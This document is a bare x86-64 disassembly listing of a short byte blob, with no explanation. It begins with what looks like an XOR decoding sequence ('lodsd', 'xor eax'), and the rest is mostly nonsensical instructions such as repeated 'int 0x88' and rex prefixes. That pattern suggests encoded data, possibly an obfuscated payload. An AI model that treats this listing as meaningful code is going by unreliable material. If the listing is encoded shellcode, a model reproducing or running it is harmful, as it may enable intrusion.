00000000  BB4756B21D        mov ebx,0x1db25647
00000005  00C1              add cl,al
00000007  AD                lodsd
00000008  C1                db 0xc1
00000009  35B4C30DB4        xor eax,0xb40dc3b4
0000000E  6D                insd
0000000F  48                rex.w
00000010  40                rex
00000011  48                rex.w
00000012  48CD88            o64 int 0x88
00000015  3D42F04848        cmp eax,0x4848f042
0000001A  48                rex.w
0000001B  48A1CF4A4848C30D  mov rax,[qword 0x6db40dc348484acf]
         -B46D
00000025  48                rex.w
00000026  48                rex.w
00000027  48                rex.w
00000028  4CCD88            o64 int 0x88
0000002B  3D42F04848        cmp eax,0x4848f042
00000030  48                rex.w
00000031  48A1394A4848C30D  mov rax,[qword 0x6db40dc348484a39]
         -B46D
0000003B  48                rex.w
0000003C  48C848CD88        o64 enter 0xcd48,0x88
00000041  3C42              cmp al,0x42
00000043  F0                lock
00000044  48                rex.w
00000045  48                rex.w
00000046  48                rex.w
00000047  48A1134A4848C30D  mov rax,[qword 0x6db40dc348484a13]
         -B46D
00000051  48                rex.w
00000052  48                rex.w
00000053  4A                rex.wx
00000054  48CD88            o64 int 0x88
00000057  3D42F04848        cmp eax,0x4848f042
0000005C  48                rex.w
0000005D  48A10D4A4848C30D  mov rax,[qword 0x6db40dc348484a0d]
         -B46D
00000067  48                rex.w
00000068  486848CD883C      push qword 0x3c88cd48
0000006E  42                rex.x
0000006F  F0                lock
00000070  48                rex.w
00000071  48                rex.w
00000072  48                rex.w
00000073  48A1674A4848C30D  mov rax,[qword 0xcbb40dc348484a67]
         -B4CB
0000007D  A84C              test al,0x4c
0000007F  CD88              int 0x88
00000081  3C42              cmp al,0x42
00000083  F0                lock
00000084  48                rex.w
00000085  48                rex.w
00000086  48                rex.w
00000087  48A1534A4848C30D  mov rax,[qword 0x6db40dc348484a53]
         -B46D
00000091  48                rex.w
00000092  48                rex.w
00000093  48                rex.w
00000094  4ACD88            o64 int 0x88
00000097  3D42F04848        cmp eax,0x4848f042
0000009C  48                rex.w
0000009D  48A14D4A4848C30D  mov rax,[qword 0x6db40dc348484a4d]
         -B46D
000000A7  48                rex.w
000000A8  49                rex.wb
000000A9  48                rex.w
000000AA  48CD88            o64 int 0x88
000000AD  3C42              cmp al,0x42
000000AF  F0                lock
000000B0  48                rex.w
000000B1  48                rex.w
000000B2  48                rex.w
000000B3  48A1A7494848C30D  mov rax,[qword 0x6db40dc3484849a7]
         -B46D
000000BD  48                rex.w
000000BE  4858              pop rax
000000C0  48CD88            o64 int 0x88
000000C3  3C42              cmp al,0x42
000000C5  F0                lock
000000C6  48                rex.w
000000C7  48                rex.w
000000C8  48                rex.w
000000C9  48A191494848C30D  mov rax,[qword 0x6db40dc348484991]
         -B46D
000000D3  48                rex.w
000000D4  4C                rex.wr
000000D5  48                rex.w
000000D6  48CD88            o64 int 0x88
000000D9  3C42              cmp al,0x42
000000DB  F0                lock
000000DC  48                rex.w
000000DD  48                rex.w
000000DE  48                rex.w
000000DF  48A18B494848C30D  mov rax,[qword 0x6db40dc34848498b]
         -B46D
000000E9  C8484848          enter 0x4848,0x48
000000ED  CD88              int 0x88
000000EF  3D42F04848        cmp eax,0x4848f042
000000F4  48                rex.w
000000F5  48A1E5494848C30D  mov rax,[qword 0x6db40dc3484849e5]
         -B46D
000000FF  48                rex.w
00000100  48                rex.w
00000101  40                rex
00000102  48CD88            o64 int 0x88
00000105  3D42F04848        cmp eax,0x4848f042
0000010A  48                rex.w
0000010B  48A1DF494848C30D  mov rax,[qword 0x6db40dc3484849df]
         -B46D
00000115  48                rex.w
00000116  48                rex.w
00000117  4808CD            o64 or bpl,cl
0000011A  883D42F04848      mov [rel 0x4848f162],bh
00000120  48                rex.w
00000121  48A1C9494848C30D  mov rax,[qword 0x6db40dc3484849c9]
         -B46D
0000012B  48                rex.w
0000012C  480848CD          o64 or [rax-0x33],cl
00000130  883C42            mov [rdx+rax*2],bh
00000133  F0                lock
00000134  48                rex.w
00000135  48                rex.w
00000136  48                rex.w
00000137  48A123494848C30D  mov rax,[qword 0xcbb40dc348484923]
         -B4CB
00000141  A868              test al,0x68
00000143  CD88              int 0x88
00000145  3D42F04848        cmp eax,0x4848f042
0000014A  48                rex.w
0000014B  48A11F494848C30D  mov rax,[qword 0x6db40dc34848491f]
         -B46D
00000155  48                rex.w
00000156  48                rex.w
00000157  4858              pop rax
00000159  CD88              int 0x88
0000015B  3D42F04848        cmp eax,0x4848f042
00000160  48                rex.w
00000161  48A109494848C30D  mov rax,[qword 0x6db40dc348484909]
         -B46D
0000016B  48                rex.w
0000016C  48                rex.w
0000016D  4868CD883C42      push qword 0x423c88cd
00000173  F0                lock
00000174  48                rex.w
00000175  48                rex.w
00000176  48                rex.w
00000177  48A163494848C30D  mov rax,[qword 0xcbb40dc348484963]
         -B4CB
00000181  A858              test al,0x58
00000183  CD88              int 0x88
00000185  3C42              cmp al,0x42
00000187  F0                lock
00000188  48                rex.w
00000189  48                rex.w
0000018A  48                rex.w
0000018B  48A15F494848C30D  mov rax,[qword 0x6db40dc34848495f]
         -B46D
00000195  48                rex.w
00000196  48                rex.w
00000197  4C                rex.wr
00000198  48CD88            o64 int 0x88
0000019B  3D42F04848        cmp eax,0x4848f042
000001A0  48                rex.w
000001A1  48A149494848C30D  mov rax,[qword 0x6db40dc348484949]
         -B46D
000001AB  48                rex.w
000001AC  48                rex.w
000001AD  49                rex.wb
000001AE  48CD88            o64 int 0x88
000001B1  3D42F04848        cmp eax,0x4848f042
000001B6  48                rex.w
000001B7  48A1A3484848C30D  mov rax,[qword 0x6db40dc3484848a3]
         -B46D
000001C1  4858              pop rax
000001C3  48                rex.w
000001C4  48CD88            o64 int 0x88
000001C7  3C42              cmp al,0x42
000001C9  F0                lock
000001CA  48                rex.w
000001CB  48                rex.w
000001CC  48                rex.w
000001CD  48A19D484848C30D  mov rax,[qword 0x6db40dc34848489d]
         -B46D
000001D7  48                rex.w
000001D8  4A                rex.wx
000001D9  48                rex.w
000001DA  48CD88            o64 int 0x88
000001DD  3C42              cmp al,0x42
000001DF  F0                lock
000001E0  48                rex.w
000001E1  48                rex.w
000001E2  48                rex.w
000001E3  48A1F7484848C30D  mov rax,[qword 0xcbb40dc3484848f7]
         -B4CB
000001ED  A808              test al,0x8
000001EF  CD88              int 0x88
000001F1  3C42              cmp al,0x42
000001F3  F0                lock
000001F4  48                rex.w
000001F5  48                rex.w
000001F6  48                rex.w
000001F7  48A1E3484848C30D  mov rax,[qword 0xcdb40dc3484848e3]
         -B4CD
00000201  8830              mov [rax],dh
00000203  42                rex.x
00000204  F0                lock
00000205  48                rex.w
00000206  48                rex.w
00000207  48                rex.w
00000208  48A1D2484848C30D  mov rax,[qword 0x6db40dc3484848d2]
         -B46D
00000212  48                rex.w
00000213  48                rex.w
00000214  48                rex.w
00000215  40CD88            int 0x88
00000218  3D42F04848        cmp eax,0x4848f042
0000021D  48                rex.w
0000021E  48A1CC484848C30D  mov rax,[qword 0x6db40dc3484848cc]
         -B46D
00000228  48684848CD88      push qword 0xffffffff88cd4848
0000022E  3C4F              cmp al,0x4f
00000230  F0                lock
00000231  48                rex.w
00000232  48                rex.w
00000233  48                rex.w
00000234  48A339C30DB4CBA8  mov [qword 0xcd40a8cbb40dc339],rax
         -40CD
0000023E  883C4F            mov [rdi+rcx*2],bh
00000241  F0                lock
00000242  48                rex.w
00000243  48                rex.w
00000244  48                rex.w
00000245  48A328C30DB46D48  mov [qword 0x48c8486db40dc328],rax
         -C848
0000024F  48CD88            o64 int 0x88
00000252  3C4F              cmp al,0x4f
00000254  F0                lock
00000255  48                rex.w
00000256  48                rex.w
00000257  48                rex.w
00000258  48A305C30DB4CBA8  mov [qword 0xcd4aa8cbb40dc305],rax
         -4ACD
00000262  883D4FF04848      mov [rel 0x4848f2b7],bh
00000268  48                rex.w
00000269  48A374C30DB46D48  mov [qword 0x4848486db40dc374],rax
         -4848
00000273  49CD88            o64 int 0x88
00000276  3D4FF04848        cmp eax,0x4848f04f
0000027B  48                rex.w
0000027C  48A361C30DB4CBA8  mov [qword 0xcd49a8cbb40dc361],rax
         -49CD
00000286  883C4F            mov [rdi+rcx*2],bh
00000289  F0                lock
0000028A  48                rex.w
0000028B  48                rex.w
0000028C  48                rex.w
0000028D  48A350C30DB46D48  mov [qword 0x4808486db40dc350],rax
         -0848
00000297  48CD88            o64 int 0x88
0000029A  3D4FF04848        cmp eax,0x4848f04f
0000029F  48                rex.w
000002A0  48A34DF049484848  mov [qword 0x8b1548484849f04d],rax
         -158B
